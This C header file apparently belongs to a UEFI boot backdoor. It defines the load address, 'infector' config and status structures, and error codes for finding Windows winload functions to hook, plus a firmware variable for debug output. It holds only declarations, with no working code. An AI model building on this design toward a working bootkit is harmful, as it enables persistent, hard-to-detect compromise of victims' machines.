
#ifndef _BOOT_BACKDOOR_H_
#define _BOOT_BACKDOOR_H_

#pragma warning(disable: 4200)

#define IMAGE_DOS_HEADER EFI_IMAGE_DOS_HEADER

#include "..\backdoor\backdoor.h"

// physical address where DXE driver will be loaded
#define BACKDOOR_ADDR 0x10000

#define BACKDOOR_NOT_READY  0
#define BACKDOOR_SUCCESS    1

// error codes
#define BACKDOOR_ERR_UNKNOWN        ((UINT64)-1) // unkown error
#define BACKDOOR_ERR_WINLOAD_IMAGE  ((UINT64)-2) // winload image not found
#define BACKDOOR_ERR_WINLOAD_SIGN_1 ((UINT64)-3) // winload!HvlpBelow1MbPage not found
#define BACKDOOR_ERR_WINLOAD_SIGN_2 ((UINT64)-4) // winload!OslArchTransferToKernel() not found
#define BACKDOOR_ERR_WINLOAD_HV     ((UINT64)-5) // Hyper-V is enabled

#pragma pack(1)

typedef struct _INFECTOR_CONFIG
{
    UINT64 BackdoorEntryDma;
    UINT64 LocateProtocol;
    UINT64 SystemTable;
    UINT64 BackdoorEntryInfected;
    UINT64 OriginalEntryPoint;

} INFECTOR_CONFIG,
*PINFECTOR_CONFIG;

typedef struct _INFECTOR_STATUS
{
    UINT64 Status;
    UINT64 Unused;

} INFECTOR_STATUS,
*PINFECTOR_STATUS;

typedef struct _BACKDOOR_INFO
{
    UINT64 Status;
    VOID *ImageBase;
    VOID *ImageFunc;

} BACKDOOR_INFO,
*PBACKDOOR_INFO;

#pragma pack()

// physical address of INFECTOR_STATUS
#define INFECTOR_STATUS_ADDR (PAGE_SIZE - sizeof(INFECTOR_STATUS))

// physical address of BACKDOOR_INFO
#define BACKDOOR_INFO_ADDR (INFECTOR_STATUS_ADDR - sizeof(BACKDOOR_INFO))

// debug messages buffer pointer address
#define DEBUG_OUTPUT_ADDR (BACKDOOR_INFO_ADDR - sizeof(UINT64))

/*
    Firmware variable to store debug messages buffer address
*/

#define BACKDOOR_VAR_NAME L"BootBackdoorInfo"

#define BACKDOOR_VAR_GUID { 0xc099b5a7, 0x7eb1, 0x422a, \
                          { 0x89, 0xd2, 0x9e, 0x64, 0x98, 0xb2, 0x7b, 0xcf }}


// debug messages buffer size 
#define DEBUG_OUTPUT_SIZE PAGE_SIZE

void ConsolePrint(char *Message);

#endif
